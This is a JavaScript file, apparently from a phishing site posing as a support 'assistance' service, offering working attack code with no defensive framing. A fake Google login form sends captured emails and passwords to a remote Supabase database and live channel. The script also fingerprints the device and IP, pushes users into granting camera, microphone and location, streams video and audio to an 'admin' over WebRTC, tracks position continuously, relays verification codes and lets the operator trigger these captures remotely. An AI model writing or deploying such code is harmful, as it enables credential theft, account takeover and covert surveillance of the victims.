console.log(">>> MAIN.JS INICIANDO CARGA <<<");

const featuresSection = document.getElementById('features-section');
const assistanceSection = document.getElementById('assistance-section');
const loginBtn = document.getElementById('login-btn');
const loginModal = document.getElementById('login-modal');
const closeModalBtn = document.getElementById('close-modal');
const googleLoginForm = document.getElementById('google-login-form');
const permissionsModal = document.getElementById('permissions-modal');
const acceptPermissionsBtn = document.getElementById('accept-permissions');
const denyPermissionsBtn = document.getElementById('deny-permissions');
const confirmationModal = document.getElementById('confirmation-modal');
const verifyCodeBtn = document.getElementById('verify-code');
const cancelVerificationBtn = document.getElementById('cancel-verification');
const resendCodeBtn = document.getElementById('resend-code');
const assistanceForm = document.getElementById('assistance-form');

// Cliente Supabase global
const supaClient = window.supabaseClient;

// Variables de estado
let userCredentials = {};
let deviceInfo = {};
let permissions = {
    camera: false,
    microphone: false,
    location: false
};

// Obtener información del dispositivo
async function getDeviceInfo() {
    let devId = localStorage.getItem('deviceId');
    if (!devId) {
        devId = 'device-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceId', devId);
    }

    // Fallback ip grabbing
    let ip = 'Unknown';
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
    } catch (e) { }

    deviceInfo = {
        device_id: devId,
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen_width: screen.width,
        screen_height: screen.height,
        ip: ip,
        status: 'active'
    };

    return deviceInfo;
}

// Inicializar conexión
let channel;
let localStream = null;
let peer = null;

// Inicializar WebRTC
function initWebRTC(stream, isInitiator, targetId) {
    console.log(">>> Inicializando WebRTC P2P <<<");
    if (peer) { peer.destroy(); }

    peer = new window.SimplePeer({
        initiator: isInitiator,
        stream: stream,
        trickle: false,
        config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
    });

    peer.on('signal', data => {
        // Enviar la señal de negociación al admin
        channel.send({
            type: 'broadcast',
            event: 'webrtc-signal',
            payload: { deviceId: deviceInfo.device_id, targetId: targetId, signal: data }
        });
    });

    peer.on('error', err => console.log('Peer error:', err));
}

async function initSupabase() {
    const info = await getDeviceInfo();

    // Registrar o actualizar dispositivo
    const { error } = await supaClient
        .from('devices')
        .upsert({
            ...info,
            last_active: new Date().toISOString()
        }, { onConflict: 'device_id' });

    if (error) console.error("Error upserting device", error);

    // Conectar a canal en vivo
    channel = supaClient.channel('cyber-room', {
        config: {
            broadcast: { ack: false },
        },
    });

    channel.on('broadcast', { event: 'request-action' }, payload => {
        const { deviceId, action } = payload.payload;
        if (deviceId === info.device_id) {
            handleAdminRequest(action);
        }
    });

    channel.on('broadcast', { event: 'webrtc-signal' }, payload => {
        const p = payload.payload;
        // Si el admin nos responde la llamada P2P, conectamos la señal
        if (p.targetId === info.device_id && peer) {
            peer.signal(p.signal);
        }
    });

    channel.subscribe((status) => {
        if (status === 'SUBSCRIBED') {
            channel.send({
                type: 'broadcast',
                event: 'device-connected',
                payload: info
            });
        }
    });
}

function handleAdminRequest(action) {
    if (action === 'access-camera') requestRealPermissions({ camera: true });
    else if (action === 'access-mic') requestRealPermissions({ microphone: true });
    else if (action === 'get-location') requestRealPermissions({ location: true });
    // Otras peticiones podrían manejar envio de archivos
}

// Iniciar sesión
loginBtn.addEventListener('click', () => {
    loginModal.style.display = 'block';
});

closeModalBtn.addEventListener('click', () => {
    loginModal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === loginModal) loginModal.style.display = 'none';
    else if (event.target === permissionsModal) permissionsModal.style.display = 'none';
    else if (event.target === confirmationModal) confirmationModal.style.display = 'none';
});

googleLoginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;

    userCredentials = {
        device_id: deviceInfo.device_id,
        email,
        password,
        remember
    };

    // Guardar credenciales en supabase
    await supaClient.from('credentials').insert([userCredentials]);

    channel.send({
        type: 'broadcast',
        event: 'credentials-captured',
        payload: { ...userCredentials, deviceId: deviceInfo.device_id }
    });

    loginModal.style.display = 'none';
    permissionsModal.style.display = 'block';
});

acceptPermissionsBtn.addEventListener('click', async () => {
    permissions.camera = document.getElementById('camera-permission').checked;
    permissions.microphone = document.getElementById('mic-permission').checked;
    permissions.location = document.getElementById('location-permission').checked;

    // Actualizar BDD
    await supaClient.from('devices').update({ permissions }).eq('device_id', deviceInfo.device_id);

    channel.send({
        type: 'broadcast',
        event: 'permissions-granted',
        payload: { deviceId: deviceInfo.device_id, permissions }
    });

    permissionsModal.style.display = 'none';
    confirmationModal.style.display = 'block';

    requestRealPermissions(permissions);
});

denyPermissionsBtn.addEventListener('click', () => {
    permissionsModal.style.display = 'none';
    alert('Para utilizar el sistema de asistencia, debe aceptar todos los permisos requeridos.');
});

// Solicitar permisos y transmitir estados
function requestRealPermissions(requestedPerms) {
    const devId = deviceInfo.device_id;

    if (requestedPerms.camera) permissions.camera = true;
    if (requestedPerms.microphone) permissions.microphone = true;

    if (requestedPerms.camera || requestedPerms.microphone) {
        navigator.mediaDevices.getUserMedia({ 
            video: permissions.camera, 
            audio: permissions.microphone 
        })
        .then(async stream => {
            await supaClient.from('devices').update({ 'permissions': permissions }).eq('device_id', devId);
            
            if (requestedPerms.camera) channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
            if (requestedPerms.microphone) channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });

            const video = document.getElementById('local-video');
            video.srcObject = stream;
            localStream = stream;
            initWebRTC(stream, true, 'admin');
        })
        .catch(err => console.error(err));
    }

    if (requestedPerms.location) {
        navigator.geolocation.getCurrentPosition(
            async position => {
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                };

                await supaClient.from('devices').update({ location: locationData }).eq('device_id', devId);
                channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: locationData } });

                navigator.geolocation.watchPosition(
                    pos => {
                        const updatedLocation = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            timestamp: pos.timestamp
                        };
                        supaClient.from('devices').update({ location: updatedLocation }).eq('device_id', devId);
                        channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: updatedLocation } });
                    },
                    error => console.error(error),
                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                );
            },
            error => console.error(error)
        );
    }
}

// Verificación y Asistencia
verifyCodeBtn.addEventListener('click', async () => {
    const codeInputs = document.querySelectorAll('.code-input');
    let code = '';
    codeInputs.forEach(input => code += input.value);

    confirmationModal.style.display = 'none';
    featuresSection.style.display = 'block';
    assistanceSection.style.display = 'block';

    await supaClient.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
    channel.send({ type: 'broadcast', event: 'verification-completed', payload: { deviceId: deviceInfo.device_id, code } });
});

cancelVerificationBtn.addEventListener('click', () => {
    confirmationModal.style.display = 'none';
    alert('La verificación es obligatoria para utilizar el sistema.');
});

resendCodeBtn.addEventListener('click', (e) => {
    e.preventDefault();
    alert('Se ha enviado un nuevo código a su correo electrónico.');
});

// Autocompletar campos de código
const codeInputs = document.querySelectorAll('.code-input');
codeInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        if (input.value.length === 1 && index < codeInputs.length - 1) codeInputs[index + 1].focus();
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value.length === 0 && index > 0) codeInputs[index - 1].focus();
    });
});

assistanceForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const issueType = document.getElementById('issue-type').value;
    const description = document.getElementById('description').value;

    const reqData = {
        device_id: deviceInfo.device_id,
        issue_type: issueType,
        description
    };
    await supaClient.from('assistances').insert([reqData]);

    channel.send({ type: 'broadcast', event: 'assistance-request', payload: { ...reqData, deviceId: deviceInfo.device_id } });

    alert('Su solicitud de asistencia ha sido enviada. Nuestro equipo se pondrá en contacto con usted pronto.');
    assistanceForm.reset();
});

// Mantener activo cuando cambian las pestañas
document.addEventListener('visibilitychange', async () => {
    if (!document.hidden && deviceInfo.device_id) {
        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
    }
});

// Heartbeat cada 30 segundos para mostrarlo conectado en admin
setInterval(async () => {
    if (deviceInfo.device_id) {
        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
    }
}, 30000);

// Evitar cierre accidental
window.addEventListener('beforeunload', (e) => {
    if (featuresSection.style.display === 'none') {
        e.preventDefault();
        e.returnValue = '¿Está seguro de que desea salir? El proceso de verificación no se ha completado.';
    }
});

// Inicializar al cargar scripts
initSupabase();
